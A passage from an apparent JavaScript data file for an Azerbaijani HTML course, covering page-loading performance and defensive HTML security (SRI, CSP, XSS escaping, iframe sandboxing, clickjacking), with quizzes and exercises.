            ["defer", "skript arxa fonda yüklənir, HTML tam oxunandan sonra icra olunur. Səhifəni gözlətmir."],
            ["loading=\"lazy\"", "şəkil yalnız ekrana yaxınlaşanda yüklənir (tənbəl yükləmə)."],
            ["width / height", "brauzer şəkil gəlməmiş yerini ayırır — məzmun «tullanmır»."],
          ]},
          { t: "tip", text: "Ekranın yuxarısında görünən ilk böyük şəklə loading=\"lazy\" YAZMA — o, dərhal lazımdır." },
        ],
      },
      {
        level: "orta",
        title: "Skriptlər, şəkillər və resurs ipucları",
        blocks: [
          { t: "code", lang: "text", code: `<script>         HTML ──■ dayanır: yüklə + icra ■── HTML davam
<script async>   HTML ───────■ icra (hazır olan kimi) ■───
<script defer>   HTML ────────────────────────■ icra (sonda, sıra ilə)`, caption: "Üç skript növü: nə vaxt icra olunur" },
          { t: "list", items: [
            "defer — öz kodun üçün default seçim: sıra saxlanılır, DOM hazır olur.",
            "async — müstəqil skriptlər üçün (analitika): sıra zəmanəti yoxdur.",
            "type=\"module\" skriptlər avtomatik defer kimidir.",
          ]},
          { t: "code", lang: "html", code: `<!-- Ekrana uyğun ölçü və müasir format -->
<picture>
  <source type="image/avif" srcset="kurs-800.avif 800w, kurs-1600.avif 1600w">
  <source type="image/webp" srcset="kurs-800.webp 800w, kurs-1600.webp 1600w">
  <img src="kurs-800.jpg" alt="Kurs"
       sizes="(max-width: 600px) 100vw, 800px"
       width="800" height="450" fetchpriority="high">
</picture>

<!-- Resurs ipucları -->
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>` },
          { t: "terms", items: [
            ["srcset + sizes", "brauzer ekranın eninə və sıxlığına görə ən uyğun faylı özü seçir. Telefon 1600 px şəkil yükləmir."],
            ["fetchpriority=\"high\"", "bu resurs vacibdir, növbədə qabağa keçsin (əsas banner şəkli)."],
            ["preconnect", "başqa domenlə bağlantını (DNS, TLS) əvvəlcədən qur."],
            ["preload", "bu fayl mütləq lazım olacaq, indi yüklə (şrift, kritik şəkil)."],
          ]},
          { t: "mistake", lang: "html", wrong: `<img src="banner.jpg" alt="Banner">`, right: `<img src="banner.jpg" alt="Banner" width="1200" height="600">`, why: "Ölçü olmayanda şəkil yüklənənə qədər hündürlük 0-dır, sonra mətn birdən aşağı tullanır (layout shift). İstifadəçi səhv düyməyə basır." },
          { t: "mistake", lang: "html", wrong: `<head>\n  <script src="analitika.js"></script>\n  <script src="chat-widget.js"></script>\n</head>`, right: `<head>\n  <script src="analitika.js" async></script>\n  <script src="chat-widget.js" defer></script>\n</head>`, why: "Adi skriptlər head-də səhifənin çəkilməsini dayandırır: fayllar yüklənib icra olunana qədər ekran ağ qalır." },
        ],
      },
      {
        level: "senior",
        title: "Kritik render yolu və Core Web Vitals",
        blocks: [
          { t: "p", text: "Kritik render yolu (critical rendering path): HTML → DOM, CSS → CSSOM, ikisi birləşib render ağacı → layout (ölçü və yer) → paint (rəngləmə) → composite (qatların birləşdirilməsi). CSS render-bloklayandır: CSSOM hazır olmadan heç nə çəkilmir. Adi skript isə parser-bloklayandır." },
          { t: "terms", items: [
            ["LCP (Largest Contentful Paint)", "ən böyük görünən elementin çəkilmə vaxtı. Yaxşı: ≤ 2.5 s. Adətən banner şəkli və ya h1."],
            ["INP (Interaction to Next Paint)", "klikdən ekranın yenilənməsinə qədər gecikmə. Yaxşı: ≤ 200 ms. Ağır JS pozur."],
            ["CLS (Cumulative Layout Shift)", "məzmunun gözlənilməz yerdəyişməsi. Yaxşı: ≤ 0.1. Ölçüsüz şəkil, reklam, gec gələn şrift pozur."],
            ["TTFB", "serverin ilk baytı göndərmə vaxtı. Keş və CDN yaxşılaşdırır."],
          ]},
          { t: "list", items: [
            "LCP şəkli HTML-də olsun (CSS background və ya JS ilə yox) ki, preload scanner onu dərhal tapsın; fetchpriority=\"high\", lazy YOX.",
            "Kritik CSS-i (ilk ekran üçün) inline ver, qalanını sonra yüklə. Çap stili: media=\"print\" render-i bloklamır.",
            "Şrift: woff2, font-display: swap, preload; mümkünsə öz serverindən (self-host).",
            "preload-u az işlət: hər şeyi «vacib» etsən, heç nə vacib olmur və bant zolağı boşa gedir.",
            "Aşağıdakı ağır bölmələr üçün CSS content-visibility: auto — ekrandan kənar hissənin render-i təxirə salınır.",
            "iframe-lərə (YouTube, xəritə) loading=\"lazy\"; daha yaxşısı — şəkil-fasad, klikdə əsl iframe.",
            "Sıxılma (Brotli), HTTP/2–3, uzunmüddətli keş (Cache-Control: immutable + fayl adında heş), CDN.",
            "Ölç, təxmin etmə: Lighthouse (laboratoriya), Chrome DevTools Performance, real istifadəçi məlumatı (CrUX, web-vitals kitabxanası). Yavaş telefonda və 4G-də sına.",
            "bfcache (geri/irəli keşi): unload hadisəsi və Cache-Control: no-store onu söndürür — geri düyməsi yavaşlayır.",
          ]},
          { t: "code", lang: "html", code: `<script src="https://cdn.example.com/lib@4.2.1/lib.min.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous" defer></script>`, caption: "TƏHLÜKƏSİZLİK: SRI (Subresource Integrity)" },
          { t: "list", items: [
            "TƏHLÜKƏSİZLİK: kənar skript (CDN, analitika, çat vidceti) sənin səhifəndə TAM hüquqla işləyir — formaları, cookie-ləri oxuya bilər. CDN sındırılsa, sən də sındırılırsan (supply chain hücumu). integrity heşi fayl dəyişibsə icranı bloklayır. Versiyanı sabitlə (@latest yox).",
            "TƏHLÜKƏSİZLİK: hər kənar skript həm sürəti, həm riski artırır. Mümkünsə öz serverindən ver, CSP-də script-src ilə icazəli mənbələri məhdudlaşdır.",
            "TƏHLÜKƏSİZLİK: dns-prefetch/preconnect istifadəçinin IP-sini həmin domenə bildirir; kənar şrift/şəkil də izləmə vasitəsi ola bilər (məxfilik, GDPR).",
          ]},
          { t: "qa", items: [
            ["async ilə defer fərqi?", "İkisi də paralel yüklənir. async hazır olan kimi icra olunur (sıra yoxdur, parseri qısa dayandıra bilər). defer parse bitəndən sonra, sənəddəki sıra ilə, DOMContentLoaded-dən əvvəl icra olunur."],
            ["LCP-ni necə yaxşılaşdırarsan?", "TTFB-ni azalt (keş/CDN), render-bloklayan CSS/JS-i azalt, LCP şəklini HTML-ə qoy + fetchpriority=high + düzgün ölçü/format (AVIF/WebP), lazy yükləmə."],
            ["CLS-in əsas səbəbləri?", "Ölçüsü verilməyən şəkil/iframe/reklam, mövcud məzmunun üstünə dinamik əlavə olunan bloklar, şrift dəyişməsi (FOUT). Həll: width/height və ya aspect-ratio, yer ayırmaq, font-display + size-adjust."],
            ["preload ilə prefetch fərqi?", "preload — cari səhifəyə mütləq lazım olan resurs, yüksək prioritet. prefetch — növbəti səhifə üçün ola bilsin lazım olacaq, aşağı prioritet, boş vaxtda."],
          ]},
          { t: "h", text: "Subresource Integrity (SRI) və üçüncü tərəf skriptlər" },
          { t: "p", text: "CDN-dən yüklənən skript və stil faylı ələ keçirilərsə, hücumçu minlərlə saytda kod icra edə bilər (supply chain hücumu). SRI brauzerə faylın gözlənilən heş-ini deyir; uyğun gəlməyəndə fayl icra olunmur." },
          { t: "code", lang: "html", code: `<script src="https://cdn.example.com/lib@1.4.2/lib.min.js"
        integrity="sha384-BURAYA_FAYLIN_HESI"
        crossorigin="anonymous"
        defer></script>

<link rel="stylesheet" href="https://cdn.example.com/lib@1.4.2/lib.min.css"
      integrity="sha384-..." crossorigin="anonymous">` },
          { t: "code", lang: "bash", code: `# Heşi yaratmaq (faylın özü üzərindən)
openssl dgst -sha384 -binary lib.min.js | openssl base64 -A` },
          { t: "list", items: [
            "integrity yalnız dəyişməz (versiyaya bağlı) URL-lərlə mənalıdır; /latest/ kimi dəyişən ünvanda hər yenilənmədə sayt sınır.",
            "crossorigin=\"anonymous\" CORS sorğusu edir; CDN uyğun Access-Control-Allow-Origin göndərməlidir, əks halda integrity yoxlaması uğursuz olur.",
            "Mümkündürsə kritik skriptləri öz serverindən ver; hər üçüncü tərəf skript (analitika, çat, reklam) səhifədə tam icazə ilə işləyir.",
            "Üçüncü tərəf sayını azalt, CSP ilə mənbələri məhdudlaşdır, lazımsız skriptləri sil.",
            "SRI Google Analytics kimi tez-tez dəyişən skriptlər üçün praktik deyil — bunu risk kimi qiymətləndir.",
          ]},
          { t: "qa", items: [
            ["SRI hansı hücumdan qoruyur?", "CDN və ya paylama kanalı ələ keçirildikdə faylın dəyişdirilməsindən: heş uyğun gəlmirsə brauzer faylı yükləməz."],
            ["SRI-dən yalnız integrity yazmaq kifayətdirmi?", "Başqa origin üçün crossorigin atributu da lazımdır, və CDN CORS başlığı verməlidir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Öz app.js faylın üçün ən yaxşı seçim?", options: ["<script src> head-də", "<script src defer>", "<script src async>"], answer: 1, why: "defer bloklamır, sıranı saxlayır və DOM hazır olanda icra olunur." },
          { t: "quiz", q: "Şəklə width və height niyə yazılır?", options: ["Şəkil daha tez yüklənsin", "Yer əvvəlcədən ayrılsın, məzmun tullanmasın", "SEO üçün məcburidir"], answer: 1, why: "Brauzer nisbəti bilir və yeri əvvəlcədən saxlayır — CLS azalır." },
          { t: "quiz", q: "Səhifənin yuxarısındakı əsas banner üçün hansı düzdür?", options: ["loading=\"lazy\"", "fetchpriority=\"high\"", "Heç bir fərqi yoxdur"], answer: 1, why: "LCP elementi mümkün qədər tez yüklənməlidir; lazy onu gecikdirir." },
        ],
      },
    ],
    exercise: {
      task: "Yavaş səhifəni sürətləndir: skriptləri bloklamayan et (app.js — defer, analitika — async), bütün şəkillərə width/height ver, yuxarıdakı bannerə fetchpriority, aşağıdakı iki şəklə və iframe-ə lazy yükləmə əlavə et.",
      starter: `<head>\n  <script src="analitika.js"></script>\n  <script src="app.js"></script>\n</head>\n<body>\n  <img src="banner.jpg" alt="Banner">\n  <h1>Kurslar</h1>\n  <p>...uzun mətn...</p>\n  <img src="kurs1.jpg" alt="HTML kursu">\n  <img src="kurs2.jpg" alt="CSS kursu">\n  <iframe src="https://www.youtube.com/embed/abc" title="Tanıtım videosu"></iframe>\n</body>\n`,
      expect: "analitika.js async, app.js defer; hər img-də width və height; banner-də fetchpriority=high və lazy YOXDUR; aşağıdakı iki img və iframe loading=lazy; alt-lar saxlanılıb.",
    },
  },
  {
    slug: "best-practice",
    title: "Senior: arxitektura və best practice",
    intro: "Bu dərs bütün HTML bölməsinin yekunudur: yaxşı HTML necə yazılır, böyük layihədə necə qorunur və canlıya çıxmazdan əvvəl nələr yoxlanır.",
    sections: [
      {
        level: "baslangic",
        title: "Yaxşı HTML-in 5 qaydası",
        blocks: [
          { t: "analogy", text: "Ev tikəndə əvvəl bünövrə və divarlar qoyulur, sonra rəng və mebel. Bünövrə əyridirsə, ən bahalı mebel də evi düzəltmir. HTML saytın bünövrəsidir: CSS və JS onun üstündə dayanır." },
          { t: "list", items: [
            "Teqi GÖRÜNÜŞƏ görə yox, MƏNAYA görə seç: başlıq — h1–h6, düymə — button, keçid — a.",
            "Bir səhifədə bir h1; başlıq səviyyələrini atlama (h2-dən sonra h4 yox).",
            "Hər şəklin alt-ı, hər input-un label-i olsun.",
            "Görünüş CSS-də, davranış JS-də, məzmun HTML-də. style=\"...\" və onclick=\"...\" ilə qarışdırma.",
            "Kodu səliqəli yaz: 2 boşluq girinti, kiçik hərflə teqlər, atributlar dırnaqda.",
          ]},
          { t: "code", lang: "html", code: `<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Kurslar — Kod Akademiyası</title>
  <meta name="description" content="Front-end və back-end kursları.">
  <link rel="stylesheet" href="/stil.css">
  <script src="/app.js" defer></script>
</head>
<body>
  <a class="skip" href="#esas">Əsas məzmuna keç</a>
  <header>
    <nav aria-label="Əsas menyu">...</nav>
  </header>
  <main id="esas">
    <h1>Kurslar</h1>
  </main>
  <footer>...</footer>
</body>
</html>`, caption: "Hər yeni səhifənin başlanğıc skeleti" },
          { t: "tip", text: "Kodu validator.w3.org-da yoxla: bağlanmamış teq, təkrar id, səhv yuvalama kimi xətaları dərhal göstərir." },
        ],
      },
      {
        level: "orta",
        title: "Proqressiv təkmilləşdirmə və komponent düşüncəsi",
        blocks: [
          { t: "p", text: "Proqressiv təkmilləşdirmə (progressive enhancement): əvvəl JS-siz işləyən HTML qur, sonra CSS ilə gözəlləşdir, sonra JS ilə rahatlaşdır. JS yüklənməsə (zəif internet, xəta, bloklayıcı) sayt yenə işləyir." },
          { t: "code", lang: "html", code: `<!-- JS-siz açılıb-bağlanan blok -->
<details>
  <summary>Kurs nə qədər davam edir?</summary>
  <p>3 ay, həftədə 3 dərs.</p>
</details>

<!-- JS-siz işləyən axtarış: forma adi GET sorğusu göndərir -->
<form action="/axtar" method="get" role="search">
  <label for="q">Axtarış</label>
  <input id="q" name="q" type="search" required>
  <button>Axtar</button>
</form>

<!-- JS-siz açılan menyu (Popover API) -->
<button type="button" popovertarget="menyu">Menyu</button>
<div id="menyu" popover>...</div>`, caption: "Native elementlər: az kod, hazır əlçatanlıq" },
          { t: "mistake", lang: "html", wrong: `<span class="link" onclick="location.href='/kurslar'">Kurslar</span>`, right: `<a href="/kurslar">Kurslar</a>`, why: "span-link yeni tabda açılmır, Tab ilə fokuslanmır, robot onu izləmir, JS-siz ölüdür. a bunların hamısını pulsuz verir." },
          { t: "mistake", lang: "html", wrong: `<div class="card">\n  <div class="card-title">Python</div>\n  <div class="card-text">Sıfırdan</div>\n  <div class="card-btn">Bax</div>\n</div>`, right: `<article class="card">\n  <h3 class="card__title">Python</h3>\n  <p class="card__text">Sıfırdan</p>\n  <a class="card__link" href="/python">Kursa bax</a>\n</article>`, why: "Komponentin özü də semantik olmalıdır. Klass adı görünüşü yox, rolu bildirsin (BEM: blok__element)." },
          { t: "list", items: [
            "Yuvalama qaydaları: a içində a/button olmaz; p içində div olmaz; ul-un birbaşa uşağı yalnız li.",
            "button-a həmişə type yaz: forma içində default submit-dir və gözlənilmədən formanı göndərir.",
            "Boolean atribut: disabled, required, hidden — dəyərsiz yazılır. disabled=\"false\" da SÖNDÜRÜR.",
            "data-* atributları — JS üçün öz məlumatın: <li data-id=\"42\">. Klassı stil üçün, data-nı məlumat üçün işlət.",
          ]},
        ],
      },
      {
        level: "senior",
        title: "Miqyas, keyfiyyət qapıları və təhlükəsiz HTML",
        blocks: [
          { t: "p", text: "Böyük layihədə HTML-i əllə yoxlamaq olmur — keyfiyyəti avtomatlaşdırırlar: linter (html-validate, eslint-plugin-jsx-a11y), CI-da Lighthouse və axe testləri, performans büdcəsi (məs. LCP ≤ 2.5 s, JS ≤ 170 KB). Qayda pozulursa, dəyişiklik birləşdirilmir (merge olunmur)." },
          { t: "list", items: [
            "Render strategiyası: məzmun saytı — statik (SSG); fərdi məlumat — server render (SSR); HTML-i axınla (streaming) göndərmək ilk baytı tezləşdirir. Tam klient render (CSR) SEO və ilk yükləməni zəiflədir.",
            "Hidrasiya (hydration) uyğunsuzluğu: server və klient HTML-i fərqlidirsə (tarix, təsadüfi ədəd, səhv yuvalama — p içində div) React xəta verir və ağacı yenidən qurur.",
            "Dizayn sistemi: Button, Input, Modal kimi komponentlər bir dəfə düzgün (semantik + əlçatan) yazılır, hər yerdə onlar işlədilir.",
            "Beynəlxalqlaşdırma: lang və dir=\"rtl\", mətn uzunluğuna dözümlü düzülüş, tarix üçün <time datetime=\"2026-11-14\">.",
            "E-poçt HTML-i ayrı dünyadır: cədvəl düzülüşü, inline stil — müasir qaydalar orada işləmir.",
            "Köhnəlmiş (deprecated) teqlər: center, font, marquee, frameset — işlətmə.",
          ]},
          { t: "h", text: "Təhlükəsizlik yoxlama siyahısı" },
          { t: "code", lang: "html", code: `<!-- 1. Kənar sayta yeni tabda link -->
<a href="https://basqa.com" target="_blank" rel="noopener noreferrer">Mənbə</a>

<!-- 2. İstifadəçi məzmunundakı linklər -->
<a href="https://..." rel="nofollow ugc noopener">istifadəçi linki</a>

<!-- 3. Etibarsız məzmunu təcrid et -->
<iframe src="/onizleme.html" sandbox="allow-scripts"
        referrerpolicy="no-referrer" loading="lazy" title="Önizləmə"></iframe>

<!-- 4. Kənar skript: sabit versiya + heş -->
<script src="https://cdn.example.com/lib@4.2.1/lib.min.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous" defer></script>

<!-- 5. Məlumat dəyişən forma: POST + CSRF tokeni -->
<form action="/profil" method="post">
  <input type="hidden" name="csrf" value="SERVERDƏN-GƏLƏN-TOKEN">
  <input name="ad" autocomplete="name" required>
  <button type="submit">Yadda saxla</button>
</form>` },
          { t: "list", items: [
            "XSS: istifadəçi mətnini HTML-ə qoyanda kontekstə görə escape et (element məzmunu, atribut, URL, script — hər birinin öz qaydası). Çərçivələr (React, Razor) default escape edir; dangerouslySetInnerHTML / Html.Raw / |safe — qırmızı bayraqdır.",
            "sandbox-da allow-scripts və allow-same-origin-i BİRLİKDƏ vermə — iframe öz sandbox-unu silə bilər. target=\"_blank\"-də rel=\"noopener\" köhnə brauzerlərdə window.opener hücumunun qarşısını alır.",
            "Clickjacking: saytını başqası görünməz iframe-də açıb istifadəçini düyməyə basdıra bilər. Qoruma HTTP başlığıdır: Content-Security-Policy: frame-ancestors 'none' (və X-Frame-Options: DENY).",
            "CSP: script-src 'self' + nonce — inline və kənar skriptləri bloklayır, XSS-in zərərini kəskin azaldır. Bunun üçün inline onclick/style-dan imtina etməlisən.",
            "Məxfi məlumatı HTML-ə yazma: şərhlər (<!-- TODO: admin şifrəsi... -->), hidden input, data-* — hamısı mənbə kodunda görünür. GET formada şifrə göndərmə: URL tarixçədə və server loglarında qalır.",
            "Fayl yükləmə formaları: accept yalnız ipucudur; SVG faylı içində skript daşıya bilər — istifadəçi SVG-sini img ilə göstər, inline yox.",
            "HTTPS hər yerdə; qarışıq məzmun (https səhifədə http resurs) bloklanır. HSTS başlığı əlavə et.",
          ]},
          { t: "qa", items: [
            ["Proqressiv təkmilləşdirmə nədir?", "Əsas funksiyanın sadə HTML ilə işləməsi, CSS və JS-in isə üstünə təkmilləşdirmə kimi gəlməsi. Nəticə: dayanıqlılıq, əlçatanlıq, sürətli ilk render."],
            ["rel=\"noopener\" nə üçündür?", "Yeni tabda açılan səhifənin window.opener vasitəsilə əvvəlki tabı idarə etməsinin (məs. fişinq səhifəsinə yönləndirməsinin) qarşısını alır."],
            ["Kod review-da HTML-də nəyə baxırsan?", "Semantika və başlıq iyerarxiyası, klaviatura/ekran oxuyucu əlçatanlığı, forma label və validasiyası, şəkil ölçüləri və yükləmə strategiyası, escape olunmayan istifadəçi məzmunu, kənar skriptlər."],
            ["XSS-ə qarşı qatlı müdafiə?", "1) Çıxışda kontekstə uyğun escape, 2) innerHTML əvəzinə textContent / təmizləyici (DOMPurify), 3) CSP + Trusted Types, 4) cookie-lərdə HttpOnly, 5) etibarsız məzmun üçün sandbox iframe."],
          ]},
          { t: "h", text: "iframe təhlükəsizliyi: sandbox və allow" },
          { t: "p", text: "Üçüncü tərəf məzmunu (video, xəritə, ödəniş formu, istifadəçi tərəfindən göndərilmiş HTML) iframe ilə yerləşdirilir. Default olaraq iframe geniş imkanlara malikdir; onu «ən az imtiyaz» prinsipi ilə məhdudlaşdırmaq lazımdır." },
          { t: "code", lang: "html", code: `<!-- Maksimum məhdudiyyət: boş sandbox hər şeyi bağlayır (skript, forma, popup, eyni origin) -->
<iframe src="https://example.com/widget" sandbox title="Widget"></iframe>

<!-- Yalnız lazım olanı aç -->
<iframe src="https://video.example.com/embed/abc"
        sandbox="allow-scripts allow-same-origin allow-presentation"
        allow="fullscreen; picture-in-picture"
        referrerpolicy="no-referrer"
        loading="lazy"
        title="Dərs videosu"></iframe>

<!-- İstifadəçi məzmunu: başqa origin-də və skriptsiz -->
<iframe srcdoc="..." sandbox></iframe>` },
          { t: "list", items: [
            "sandbox bütün imkanları bağlayır; allow-scripts, allow-forms, allow-popups, allow-same-origin kimi token-lərlə seçilmiş imkanlar geri açılır.",
            "allow-scripts + allow-same-origin birlikdə, iframe SƏNİN origin-indəndirsə, təhlükəlidir: iframe içindəki skript sandbox atributunu özü silə bilər. Yalnız başqa origin-dən olan məzmun üçün birgə işlət.",
            "allow atributu (Permissions Policy) kamera, mikrofon, geolokasiya, ödəniş kimi güclü API-lərə icazəni idarə edir; default olaraq verməmək daha yaxşıdır.",
            "Başqa tərəfin səni iframe-ə salmasını qadağan etmək üçün öz səhifən üçün frame-ancestors 'none' (CSP) və ya X-Frame-Options göndər; CSP frame-src ilə hansı saytları iframe-də göstərə biləcəyini məhdudlaşdır.",
            "title atributu həm əlçatanlıq, həm kontekst üçün vacibdir.",
          ]},
          { t: "mistake", lang: "html", wrong: `<iframe src="/istifadeci-yukledi.html" sandbox="allow-scripts allow-same-origin"></iframe>`, right: `<iframe src="https://usercontent.sayt.az/f/123" sandbox="allow-scripts"></iframe>`, why: "Eyni origin-də allow-scripts və allow-same-origin birgə sandbox-u mənasız edir. İstifadəçi məzmununu ayrı domendən (usercontent) və yalnız lazımi token ilə göstər." },
          { t: "qa", items: [
            ["iframe sandbox nə edir?", "iframe-in imkanlarını (skript, forma, popup, eyni origin, naviqasiya) default olaraq bağlayır; icazələr token ilə seçilir."],
            ["Clickjacking-i kim, harada dayandırır?", "Səni iframe-ə salınmaqdan qorumaq üçün SƏNİN serverin frame-ancestors / X-Frame-Options başlığı göndərməlidir; iframe-in sandbox-ı isə sənin içinə yerləşdirdiyin məzmunu məhdudlaşdırır."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "<button disabled=\"false\"> necə işləyir?", options: ["Aktivdir", "Söndürülüb", "Xəta verir"], answer: 1, why: "Boolean atributun mövcudluğu kifayətdir — dəyəri nəzərə alınmır." },
          { t: "quiz", q: "sandbox iframe-də hansı cütlük təhlükəlidir?", options: ["allow-scripts + allow-same-origin", "allow-forms + allow-popups", "sandbox + loading=lazy"], answer: 0, why: "Bu ikisi birlikdə iframe-ə öz sandbox atributunu silməyə imkan verir." },
          { t: "quiz", q: "JS yüklənməsə də işləyən açılan blok?", options: ["<div onclick>", "<details> + <summary>", "<span class=\"toggle\">"], answer: 1, why: "details native elementdir — JS tələb etmir, klaviatura ilə də işləyir." },
        ],
      },
    ],
    exercise: {
      task: "Yekun: «Kurslar» səhifəsini sıfırdan yaz. Tam head (charset, viewport, title, description), skip link, header>nav, main içində h1 və 2 kurs kartı (article: h2, p, şəkil alt+ölçü ilə, link), details ilə 1 sual-cavab, e-poçt abunə forması (label, type=email, required), footer-də kənar sayta təhlükəsiz link.",
      starter: `<!DOCTYPE html>\n<html lang="az">\n<head>\n\n</head>\n<body>\n\n</body>\n</html>\n`,
      expect: "DOCTYPE, lang, charset, viewport, title, description; skip link main id-sinə; header>nav, bir main, bir h1, article-larda h2 (səviyyə atlanmır); img-lərdə alt+width+height; details/summary; forma: label for/id, type=email, required, button type=submit; kənar link target=_blank + rel=noopener; div-düymə/span-link, inline onclick yoxdur.",
    },
  },
];
